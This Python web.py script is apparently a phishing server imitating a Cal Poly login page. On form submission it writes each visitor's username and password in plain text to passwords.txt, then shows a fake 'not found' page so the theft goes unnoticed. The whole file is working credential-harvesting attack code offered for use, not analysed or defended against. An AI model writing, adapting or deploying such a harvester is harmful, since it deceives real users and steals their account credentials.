import web

urls = (
   '/', 'index', 
   '/', 'templates',
   '/', 'login'
)

render = web.template.render('templates/')

class index:
   def GET(self):
      return render.calpoly()

   def POST(self):
      form = web.input(username="", password="")
      f = open('passwords.txt', 'w')
      f.write("Username: " + form.username)
      f.write(" Password: " + form.password + "\n")
      print(form)
      return render.notFound()

if __name__ == "__main__":
   app = web.application(urls, globals())
   app.run()
